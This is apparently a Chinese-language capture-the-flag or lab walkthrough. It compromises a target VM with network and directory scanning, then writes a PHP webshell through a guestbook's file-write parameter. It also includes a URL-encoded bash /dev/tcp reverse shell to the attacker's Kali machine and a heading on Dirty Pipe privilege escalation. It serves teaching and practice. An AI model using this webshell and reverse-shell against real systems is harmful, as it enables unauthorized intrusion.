# 1、信息收集
## (1)主机发现 :先在kali中扫描局域网,找到靶机IP 
## `arp-scan -l`(sudo)
### -l(localnet)
![alt text](../img/image-12.png)
## `netdiscover -r 192.168.1.0/24`(动态刷新)
### -r(range)
![alt text](../img/image-13.png)

## (2)端口与服务扫描 :对目标IP进行全端口扫描并探测服务版本
## `nmap -p- -sV -T4 192.168.254.141`
### -p- :扫描全端口(1-65535)
### -sV :探测端口上运行的服务及其版本号
### -T4 :扫描速度(激进速度)
![alt text](../img/image-14.png)

## 在80端口找到username(Cypher)
![alt text](../img/image-15.png)
## 81端口发现一个ssh登录框
![alt text](../img/image-16.png)

## (3)Web目录扫描
## `gobuster dir -u http://192.168.254.129 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt`
### gobuster :Go语言编写的高性能目录扫描器
### dir :执行目录/文件枚举模式(还有dns、vhost等模式)
### -u(URL) :通常要加上协议头(http),不然它不知道要用http还是https协议
### -w(Wordlist) :字典;这里指定了kali自带的dirbuster中型字典,大概22万条常见的目录和文件名
### -x(Extensions) :扩展名;比如字典里有一行 admin，gobuster 不仅会请求 http://192.168.254.141/admin，还会自动帮你请求 http://.../admin.php、http://.../admin.html 和 http://.../admin.txt
## `gobuster dir -u http://192.168.254.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 -b 403,404` :多线程加速与屏蔽无用状态码
![alt text](../img/image-17.png)

## graffiti.txt
![alt text](../img/image-18.png)
## graffiti.php,跳转到一个留言板
![alt text](../img/image-19.png)



# 2、web渗透,获取shell

## (1)寻找漏洞
## 试着上传些什么,发现显示在页面,查看源码
![alt text](../img/image-22.png)

## (2)写入webshell
## 用burpsuite抓包,修改为`message=<?php system($_GET['cmd']); ?>`&file=shell.php
### 将php上传到shell.php,因为是用PHP解析器解析
![alt text](../img/image-21.png)

## 访问`192.168.254.141/shell.php?cmd=id`,写入成功
![alt text](../img/image-20.png)

## (3)获取交互式shell
## kali :`nc -lvnp 4444`
## 浏览器 :`http://192.168.254.141/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.254.129/4444%200%3E%261%22` (bash -c "bash -i >& /dev/tcp/192.168.254.129/4444 0>&1") :URL编码;前面那个IP是靶机IP,后面那个IP是kaliIP
### bash -c "..." :告诉系统启动一个Bash进程,并且执行引号里面的字符串作为命令
### bash -i :启动一个交互式的bash终端
### >& /dev/tcp/192.168.254.129/4444 :Linux Bash 内置的一个极其强大的特性（不需要借助 nc 或 python 等工具），它把网络连接映射成了文件;向 192.168.254.129（你的 Kali 机器）的 4444 端口发起 TCP 连接，并且把标准输出（stdout）和标准错误（stderr）都发送到这个连接上
### 0>&1 :把标准输入(stdin,文件描述符0)重定向到标准输出(文件描述符1)


# 3、权限提升

## (1)检查内核版本()
![alt text](../img/image-23.png)

## (2)利用Dirty Pipe提权